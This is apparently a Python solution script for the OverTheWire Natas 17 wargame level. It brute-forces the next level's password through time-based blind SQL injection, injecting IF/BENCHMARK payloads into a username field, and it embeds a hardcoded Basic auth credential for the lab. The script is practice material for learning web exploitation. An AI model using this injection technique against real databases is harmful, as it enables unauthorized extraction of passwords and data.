
from string import ascii_letters, digits
import random
import requests

def searchUsername(username):
    return requests.post(
        'http://natas17.natas.labs.overthewire.org/index.php',
        data={
            'username' : username
        },
        proxies = {
            'http' : '127.0.0.1:8080',
            'https' : '127.0.0.1:8080'
        },
        headers={
            'Host' : 'natas17.natas.labs.overthewire.org',
            'Origin' : 'http://natas17.natas.labs.overthewire.org',
            'Referrer': 'http://natas17.natas.labs.overthewire.org',
            'Authorization' : 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
        }
    )

def pwCharGenerator():
    for c in (ascii_letters+digits):
        yield c

username = 'natas18'    # username to bruteforce
password = "_"*32

print("Brute-forcing password for username " + username)
print(password)
for idx in range(0, len(password)):
    for c in pwCharGenerator():
        pw_prefix = password[:idx] + c

        # Construct IF(blind_expr, expr_true, expr_false)
        # Both bellow blind expressions are valid
        blind_expr_1 = 'SUBSTRING(password,{},{}) = CHAR({})'.format(idx+1, idx+1, ord(c))
        blind_expr_2 = 'password LIKE BINARY "{}%"'.format(pw_prefix)
        blind_expr = blind_expr_2

        true_expr = 'BENCHMARK(50000000, ENCODE("MSG", "s0m3ke3y"))'
        false_expr = 'null'

        username_parameter = '{}" AND 1=IF({}, {}, {}) #'.format(username, blind_expr, true_expr, false_expr)

        # Debug
        # full_query = 'SELECT * from users WHERE username="{}"'.format(username_parameter)
        # print(full_query)

        r = searchUsername(username_parameter)
        assert(r.status_code == 200)
        t = r.elapsed
        msec = t.seconds*1000 + t.microseconds/1000

        # Debug. Used to find a good N value for BENCHMARK(N, expr)
        # print(c + ':' + str(msec))

        if msec > 2000:
            password = password[:idx] + c + password[idx+1:]
            print(password)
            break

    assert(password[idx] != '_')

print("\n~~~ Credentials for level18 ~~~")
print("UN: natas18")
print("PW: " + password)
print("~~~ ~~~~~~~~~~~ ~~~ ~~~~~~~ ~~~\n")
